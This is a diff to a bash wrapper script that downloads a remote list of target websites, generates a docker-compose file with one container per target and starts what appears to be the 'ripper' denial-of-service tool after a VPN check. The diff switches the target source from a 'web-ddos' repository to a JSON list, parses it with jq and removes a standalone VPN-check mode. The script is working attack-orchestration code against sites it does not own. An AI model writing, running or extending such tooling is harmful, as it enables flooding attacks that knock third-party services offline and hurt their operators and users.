@@ -5,7 +5,7 @@
 # 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)
 
 VERSION='2.1'
-TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+TARGETS_URL='https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'
 CHECK_VPN_API_URL='https://ipapi.com/ip_api.php?ip='
 
 function print_help {
@@ -41,7 +41,6 @@ function generate_compose {
     echo -e "version: '3'" > docker-compose.yml
     echo -e "services:" >> docker-compose.yml
     counter=1
-    
     while read -r site_url; do
         if [ $counter -le $amount ]; then
             if [ ! -z $site_url ]; then
@@ -103,7 +102,7 @@ while test -n "$1"; do
   shift
 done
 
-curl --silent $TARGETS_URL --output targets.txt
+curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt
 
 check_dependencies
 check_params
@@ -126,9 +125,6 @@ case $mode in
     generate_compose
     check_vpn_status
     ripper_start
-    ;;
-  vpncheck)
-    check_vpn_status
     ;;
   *)
     echo "Wrong mode"
